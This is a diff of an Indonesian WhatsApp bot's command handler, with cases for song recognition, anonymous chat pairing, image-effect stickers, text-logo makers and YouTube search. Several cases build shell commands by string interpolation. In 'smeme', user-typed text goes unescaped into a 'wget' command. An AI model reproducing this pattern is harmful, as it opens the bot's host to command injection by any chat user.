+{
+"quickReplyButton": {
+"displayText": "Instagram",
+"id": "60dd75b0081979507a679f99"
+}
+}
+]
+}
+}
+}, {}) 
+xdev.relayWAMessage(res)
+break
+
+
+
+
+	
+	
+	
+case 'whatmusic':
+if (isQuotedAudio) {
+setReply(mess.wait)
+encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+media = await xdev.downloadAndSaveMediaMessage(encmedia)
+ran = getRandom('.mp3')
+exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+fs.unlinkSync(media)
+if (err) return setReply('Gagal mengkonversi audio ke ptt')
+sample = fs.readFileSync(ran)
+acr.identify(sample).then(async metadata => {
+if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
+var res = metadata.metadata.music[0]
+rus = await yts(res.title)
+if(rus.all.length == "0") return setReply("Video tidak bisa di download")
+ras = await rus.all.filter(v => v.type == 'video')
+let info = await ytdl.getInfo(ras[0].url);
+let audio = ytdl.filterFormats(info.formats, 'audioonly');
+let format = ytdl.chooseFormat(info.formats, { quality: '18' });
+let videoID = ras[0].videoId
+
+try{
+var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
+} catch(err) {
+var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
+}
+yamyam = await getBuffer(`${thumbnya}`)
+let aklo = [
+{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
+]
+
+let teks = `
+*RESULT FOUND* 💽
+
+📂 Title: ${res.title}
+👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
+💾 Album: ${res.album.name || ''}
+🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
+🌏 Release Date: ${res.release_date}
+⏳ Durasi : ${ras[0].timestamp}
+🎧 Audio : ${FileSize(audio[0].contentLength)}
+🎬 Video : ${FileSize(format.contentLength)}
+`
+sendButLocation(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
+});
+fs.unlinkSync(ran)
+})
+} else if (isQuotedVideo) {
+setReply(mess.wait)
+encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+media = await xdev.downloadAndSaveMediaMessage(encmedia)
+ran = getRandom('.mp3')
+exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
+fs.unlinkSync(media)
+if (err) return setReply(`Err: ${err}`)
+sample = fs.readFileSync(ran)
+acr.identify(sample).then(async metadata => {
+if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
+var res = metadata.metadata.music[0]
+rus = await yts(res.title)
+if(rus.all.length == "0") return setReply("Video tidak bisa di download")
+ras = await rus.all.filter(v => v.type == 'video')
+let info = await ytdl.getInfo(ras[0].url);
+let audio = ytdl.filterFormats(info.formats, 'audioonly');
+let format = ytdl.chooseFormat(info.formats, { quality: '18' });
+let videoID = ras[0].videoId
+
+try{
+var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
+} catch(err) {
+var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
+}
+yamyam = await getBuffer(`${thumbnya}`)
+let aklo = [
+{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
+]
+
+let teks = `
+*RESULT FOUND* 💽
+
+📂 Title: ${res.title}
+👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
+💾 Album: ${res.album.name || ''}
+🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
+🌏 Release Date: ${res.release_date}
+⏳ Durasi : ${ras[0].timestamp}
+🎧 Audio : ${FileSize(audio[0].contentLength)}
+🎬 Video : ${FileSize(format.contentLength)}
+`
+sendButLocation(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
+});
+fs.unlinkSync(ran)
+ })
+ } else {
+setReply("Reply audio atau video")
+}
+break
+
+	
+		
+case 'sendkontak': case 'sendcontact': {
+if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
+this.anonymous = this.anonymous ? this.anonymous : {}
+let room = Object.values(this.anonymous).find(room => room.check(m.sender))
+if (!room) {
+let buttons = [
+{ buttonId:`${prefix}start`, buttonText: { displayText: 'Start' }, type: 1 }
+                    ]
+teks = `Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner`
+await sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), buttons, {contextInfo: forward})
+} else {
+
+try {
+var ppimg = await xdev.getProfilePicture(room.b)
+} catch {
+var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+}
+
+let mok = [
+{ buttonId:`${prefix}stop`, buttonText: { displayText: 'stop' }, type: 1 }
+ ]
+
+foto = await getBuffer(ppimg)
+stst = await xdev.getStatus(`${room.b.split("@")[0]}@c.us`)
+stst = stst.status == 401 ? '' : stst.status
+yahu = xdev.contacts[room.b] != undefined ? xdev.contacts[room.b].notify = undefined ? PhoneNumber('+' + room.b.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[room.b].notify || xdev.contacts[room.b].vname : PhoneNumber('+' + room.b.replace('@s.whatsapp.net', '')).getNumber('international')
+menunya = `
+Nama : ${yahu}
+Bio : ${stst}
+User : wa.me/${room.b.split("@")[0]}`
+sendButLocation(room.a, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, foto, mok, {contextInfo: forward})
+sendKontak(room.a, room.b.split("@")[0], yahu, stst);
+}
+}
+break
+	
+	
+case 'anonymous': 
+if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
+buttons = [
+{ buttonId: `${prefix}start`, buttonText: { displayText: `sᴛᴀʀᴛ` }, type: 1 },
+{ buttonId: `${prefix}me`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 }
+ ]
+teks = `Hai ${pushname} selat datang di Anonymous Chat\n\nKlik button dibawah ini untuk memcari partner`
+sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                   
+break
+			
+	
+case 'mulai': case 'start': {
+if (isGroup) return setReply(mess.only.group)
+this.anonymous = this.anonymous ? this.anonymous : {}
+let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
+if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
+let buttons = [
+{ buttonId: `${prefix}keluar`, buttonText: { displayText: `sᴛᴏᴘ`}, type: 1 },
+{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }
+                    ]
+teks = `Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda`
+sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})
+} else               
+if (room) {
+let buttons = [
+{ buttonId: `${prefix}next`, buttonText: { displayText: `sᴋɪᴘ` }, type: 1 },
+{ buttonId: `${prefix}keluar`, buttonText: { displayText: `sᴛᴏᴘ` }, type: 1 }
+                    ]
+teks =`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`
+await sendButLocation(room.a, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                                        
+room.b = m.sender
+room.state = 'CHATTING'
+await sendButLocation(room.b, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                               
+} else {
+let id = + new Date
+this.anonymous[id] = {
+id,
+a: m.sender,
+b: '',
+state: 'WAITING',
+check: function (who = '') {
+return [this.a, this.b].includes(who)
+},
+other: function (who = '') {
+return who === this.a ? this.b : who === this.b ? this.a : ''
+},
+}
+let buttons = [
+{ buttonId: `${prefix}keluar`, buttonText: { displayText: `sᴛᴏᴘ` }, type: 1 },
+{ buttonId: `${prefix}me`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 }
+                    ]
+teks1 = `Mohon Tunggu Sedang Mencari Partner`
+await sendButLocation(from, teks1, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                               
+}
+break
+}
+            
+  
+case 'keluar': case 'stop': {
+if (m.isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
+this.anonymous = this.anonymous ? this.anonymous : {}
+let room = Object.values(this.anonymous).find(room => room.check(m.sender))
+if (!room) {
+let buttons = [
+{ buttonId: `${prefix}start`, buttonText: { displayText: 'Start' }, type: 1 }
+                    ]
+teks = `Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner `
+sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})             
+} else {
+setReply('Kamu telah berhenti dari Anonymus Chat')
+let other = room.other(m.sender)       
+let buttons = [
+{ buttonId: `${prefix}next`, buttonText: { displayText: 'next' }, type: 1 }
+                    ]
+if (other) await sendButLocation(other, `Partner Telah Meninggalkan Sesi Anonymous`, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})
+delete this.anonymous[room.id]
+}
+}
+break
+            
+   
+         
+case 'next': case 'lanjut': {
+if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
+this.anonymous = this.anonymous ? this.anonymous : {}
+let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
+
+if (!romeo) {
+let buttons = [
+{ buttonId: `${prefix}start`, buttonText: { displayText: 'Start' }, type: 1 }
+                    ]
+teks =`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner`
+return sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})                                         
+
+} 
+let other = romeo.other(m.sender)
+if (other) await xdev.sendMessage(other, `Partner Telah Meninggalkan Sesi Anonymous`, text)
+delete this.anonymous[romeo.id]
+
+let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
+if (room) {
+let buttons = [
+{ buttonId: `${prefix}next`, buttonText: { displayText: 'Skip' }, type: 1 },
+{ buttonId: `${prefix}keluar`, buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+teks =`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`
+await sendButLocation(room.a, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})              
+room.b = m.sender
+room.state = 'CHATTING'
+await sendButLocation(room.b, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})              
+} else {
+let id = + new Date
+this.anonymous[id] = {
+id,
+a: m.sender,
+b: '',
+state: 'WAITING',
+check: function (who = '') {
+return [this.a, this.b].includes(who)
+},
+other: function (who = '') {
+return who === this.a ? this.b : who === this.b ? this.a : ''
+},
+}
+let buttons = [
+{ buttonId: `${prefix}stop`, buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+teks =`Mohon Tunggu Sedang Mencari Partner`
+await sendButLocation(from, teks, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/anonymous.jpg'), buttons, {contextInfo: forward})              
+}
+break
+}
+         
+             
+	
+case 'suitpvp': case 'suit': {
+this.suit = this.suit ? this.suit : {}
+let poin = 10
+let poin_lose = 10
+let timeout = 60000
+if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
+if (!m.mentionedJid[0]) return xdev.sendMessage(from, `_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${ownerNumber[0].split("@")[0]}`, text, { mentionedJid: [`${ownerNumber[0]}`] })
+if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return setReply( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
+let id = 'suit_' + new Date() * 1
+let caption = `_*SUIT PvP*_
+
+@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
+
+Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
+this.suit[id] = {      
+chat: await mentions(caption, parseMention(caption), true),
+id: id,
+p: m.sender,
+p2: m.mentionedJid[0],
+status: 'wait',
+waktu: setTimeout(() => {
+if (this.suit[id]) xdev.sendMessage(from, `_Waktu suit habis_`, text)            
+delete this.suit[id]
+}, 60000), poin, poin_lose, timeout
+}
+}
+break
+	
+	
+	
+case 'triggered':
+case 'wasted':
+case 'comrade':
+case 'horny':
+case 'blur':
+case 'pixelate':
+case 'simpcard':
+case 'lolice':
+case 'glass':
+if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
+ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
+setReply(mess.wait)
+owgi = await xdev.downloadMediaMessage(ger)
+anu = await upload(owgi)
+ranp = getRandom('.gif')
+rano = getRandom('.webp')
+anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
+exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
+fs.unlinkSync(ranp)
+if (err) return setReply(`${err}`)
+xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
+fs.unlinkSync(rano)
+})
+} else if (isQuotedTag || isQuotedReply) {
+setReply(mess.wait)
+ghost = dev.message.extendedTextMessage.contextInfo.participant || dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
+oppp = await xdev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
+datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
+fs.writeFileSync('janckuk.jpeg', datae, 'base64')
+anu = await upload(fs.readFileSync('./janckuk.jpeg'))
+ranp = getRandom('.gif')
+rano = getRandom('.webp')
+anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
+exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
+fs.unlinkSync(ranp)
+if (err) return setReply(`${err}`)
+xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
+fs.unlinkSync(rano)
+})
+} else {
+setReply('Gunakan foto!')
+}
+break 
+
+
+
+
+case '3000years':
+case 'approved':
+case 'wanted':
+case 'utatoo':
+case 'unsharpen':
+case 'thanos':
+case 'sniper':
+case 'sharpen':
+case 'sepia':
+case 'scary':
+case 'rip':
+case 'redple':
+case 'rejected':
+case 'posterize':
+case 'ps4':
+case 'pixelize':
+case 'missionpassed':
+case 'moustache':
+case 'lookwhatkarenhave':
+case 'jail':
+case 'invert':
+case 'instagram':
+case 'greyscale':
+case 'glitch':
+case 'gay':
+case 'frame':
+case 'fire':
+case 'distort':
+case 'dictator':
+case 'deepfry':
+case 'ddungeon':
+case 'circle':
+case 'challenger':
+case 'burn':
+case 'brazzers':
+case 'beautiful':
+if (isQuotedImage) {
+setReply(mess.wait)
+ encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+ ahah = await xdev.downloadMediaMessage(encmedia)
+ranp = getRandom('.jpg')
+//ahah = await xdev.downloadMediaMessage(ger)
+fs.writeFileSync(`./${ranp}`, ahah);
+owgi = await upload(fs.readFileSync(ranp))
+ini_gen = `${command}`
+ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
+xdev.sendMessage(from, gambar, image, {quoted: dev, caption: "Nih"})
+fs.unlinkSync(ranp)
+}).catch(err => {
+setReply(`${err}`)
+});  
+} else if (isQuotedTag || isQuotedReply) {
+setReply(mess.wait)
+ghost = dev.message.extendedTextMessage.contextInfo.participant || dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
+oppp = await xdev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
+datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
+fs.writeFileSync('janckuk.jpeg', datae, 'base64')
+anuk = await upload(fs.readFileSync('./janckuk.jpeg'))
+ini_gen = `${command}`
+console.log(color(ini_gen))
+ameApi.generate(ini_gen, {
+url : anuk
+}).then(gambar => {
+xdev.sendMessage(from, gambar, image, {quoted: dev, caption: "Nih"})
+fs.unlinkSync('./janckuk.jpeg')
+}).catch(err => {
+setReply(`${err}`)
+});    
+} else {
+setReply("Tag atau Reply targetnya")
+}
+break
+            
+     
+
+			
+
+      
+    
+case 'smeme': case 'stickmeme': case 'sm': 
+if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
+var top = q.split('|')[0] ? q.split('|')[0] : ''
+var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
+if ((isMedia && !dev.message.videoMessage || isQuotedImage ) && args.length >= 0) {
+ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
+setReply(mess.wait)
+olalah = await xdev.downloadMediaMessage(ger)
+anuah = await upload(olalah)
+ranp = getRandom('.gif')
+rano = getRandom('.webp')
+anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
+exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
+fs.unlinkSync(ranp)
+if (err) return setReply(`${err}`)
+xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
+fs.unlinkSync(rano)
+})
+} else {
+setReply('Gunakan foto!')
+}
+break    
+    
+    
+	
+
+	
+
+
+ 
+case 'tomp4':
+case 'tovideo':
+if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
+setReply(mess.wait)
+ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
+file = await  xdev.downloadAndSaveMediaMessage(ger)
+outGif = `./temp/${getRandom('.gif')}`
+outMp4 = `./temp/${getRandom('.mp4')}`
+status = false
+//convert webp ke gif pakai imagemagick
+exec(`convert ${file} ${outGif}`, (err) => {
+if (err) {
+console.log(err)
+return setReply(`${err}`)
+}
+
+//lalu convert gif ke mp4 pakai ffmpeg
+exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
+if (err) {
+console.log(err)
+return setReply(`${err}`)
+ }      
+sendVideo(fs.readFileSync(outMp4))
+status = true
+ if(status){
+ fs.unlinkSync(outGif)
+ fs.unlinkSync(outMp4)
+ fs.unlinkSync(file)
+ status = false
+ }
+    })
+}) 
+
+}
+break
+	
+	
+case 'togif':
+if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
+setReply(mess.wait)
+ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
+file = await  xdev.downloadAndSaveMediaMessage(ger)
+outGif = `./temp/${getRandom('.gif')}`
+outMp4 = `./temp/${getRandom('.mp4')}`
+status = false
+//convert webp ke gif pakai imagemagick
+exec(`convert ${file} ${outGif}`, (err) => {
+if (err) {
+console.log(err)
+return setReply(`${err}`)
+}
+
+//lalu convert gif ke mp4 pakai ffmpeg
+exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
+if (err) {
+console.log(err)
+return setReply(`${err}`)
+ }      
+sendGif(fs.readFileSync(outMp4))
+status = true
+ if(status){
+ fs.unlinkSync(outGif)
+ fs.unlinkSync(outMp4)
+ fs.unlinkSync(file)
+ status = false
+ }
+    })
+}) 
+
+} else if(isQuotedVideo){
+setReply(mess.wait)
+ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
+outMp4 = `${getRandom('.mp4')}`
+file = await xdev.downloadMediaMessage(ger);
+fs.writeFileSync(`./${outMp4}`, file);
+sendGif(fs.readFileSync(outMp4))
+fs.unlinkSync(`./${outMp4}`)
+}
+break
+	
+	
+	
+	
+	
+	
+	
+	case 'blackping':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	case 'glitch':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	case 'glitch2':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
+	setReply(mess.wait)
+	teks1 = q.split("|")[0]
+	teks2 = q.split("|")[1]
+	textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	case 'glitch3':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
+	setReply(mess.wait)
+	teks1 = q.split("|")[0]
+	teks2 = q.split("|")[1]
+	textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	
+	case '3dspace':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
+	setReply(mess.wait)
+	teks1 = q.split("|")[0]
+	teks2 = q.split("|")[1]
+	textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	case 'lion':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
+	setReply(mess.wait)
+	teks1 = q.split("|")[0]
+	teks2 = q.split("|")[1]
+	textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	case '3dneon':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	
+	case 'neon':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/neon-text-effect-online-879.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	case 'greenneon':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/green-neon-text-effect-874.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+   
+   
+   
+   
+   case 'bokeh':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/bokeh-text-effect-876.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+   
+   
+	
+	
+	case 'hollographic':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	case 'bear':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	teks1 = q.split("|")[0]
+	teks2 = q.split("|")[1]
+	textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	
+	
+	case 'wolf':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	teks1 = q.split("|")[0]
+	teks2 = q.split("|")[1]
+	textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	
+	
+	
+case 'yts':
+ try {
+  if (!q) return setReply('Format salah')
+setReply('Tunggu sebentar')
+ rus = await yts(q)
+ res = await rus.all.filter(v => v.type == 'video')
+ let videoID = res[0].videoId
+
+try{
+var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
+} catch(err) {
+var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
+}
+ a = `*Youtube Search 🔎*\n`
+for (let i of res) {
+a += `
+📜 Title : ${i.title}
+📈 Views : ${i.views}
+🌐 Upload : ${i.ago}
+⏱️ Durasi : ${i.timestamp}
+🎥 Channel : ${i.author.name}
+🖇️ Link : ${i.url}\n\n`
+}
+b = a.trim()
+
+imag = await getBuffer(res[0].image)
+let mok = [{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
+sendButLocation(from, b, `Baterai : ${baterai.battery}\n© ${fake1}`, imag, mok, {contextInfo: forward})
+
+ } catch (e) {
+ console.log(e)
+ setReply(`${e}`)
+}
+break
+	
+	
+	
+	
+	
+	
+case 'play':{
+if(!q) return setReply("Teksnya mana om")
+setReply(mess.wait)
+rus = await yts(q)
+if(rus.all.length == "0") return setReply("Video tidak bisa di download")
+data = await rus.all.filter(v => v.type == 'video')
+
+
+try{
+var res = data[0]
+var info = await ytdl.getInfo(res.url);
+console.log(info)
+} catch{
+var res = data[1]
+var info = await ytdl.getInfo(res.url);
+}
+
+
+let audio = ytdl.filterFormats(info.formats, 'audioonly');
+let format = ytdl.chooseFormat(info.formats, { quality: '18' });
+
+
+try{
+var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/mqdefault.jpg`
+} catch(err) {
+var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/sqdefault.jpg`
+}
+
+
+inithumb = await getBuffer(thumbnya)
+options1 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: inithumb, mediaUrl: res.url}}}
+teks =`
+📂 Judul : ${res.title}
+🌐 Ditonton : ${h2k(res.views)} Kali
+⏳ Durasi : ${res.timestamp}
+👤 Channel : ${res.author.name}
+🎧 Audio : ${FileSize(audio[0].contentLength)}
+🎬 Video : ${FileSize(format.contentLength)}`
+
+yamyam = await getBuffer(`${thumbnya}`)
+let aklo = [
+{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
+]
+
+if(setmenu === "document") {
+Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${teks}`, `© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), aklo, options1)
+} else {
